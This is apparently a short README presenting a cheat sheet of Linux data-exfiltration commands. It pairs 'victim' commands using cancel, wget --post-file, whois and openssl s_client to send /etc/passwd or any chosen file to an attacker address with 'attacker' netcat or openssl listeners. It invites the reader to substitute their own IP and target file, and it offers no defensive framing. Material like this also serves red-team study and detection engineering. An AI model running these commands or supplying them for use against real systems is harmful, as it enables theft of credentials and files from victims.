# Data-Exfil-with-Linux-Binaries
Data exfiltration by abusing built in linux binaries

// Replace 192.168.10.10 with your IP
// replace /etc/passwd with the file you want to exfiltrate

Victim
```
cancel -u "$(cat /etc/passwd)" -h 192.168.10.10:9999
```
Attacker
```
nc -lvnp 9999
```
Victim
```
wget --post-file=/etc/passwd 192.168.10.10
```
Attacker
```
nc -lvnp 9999
```
Victim
```
whois -h 192.168.10.10 -p 9999 `cat  /etc/passwd`
```
Attacker
```
nc -lvnp 9999
```
Victim
```
openssl s_client -quiet -connect 192.168.10.10:9999 < "/etc/passwd"
```
Attacker
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 9999 > passwd
```
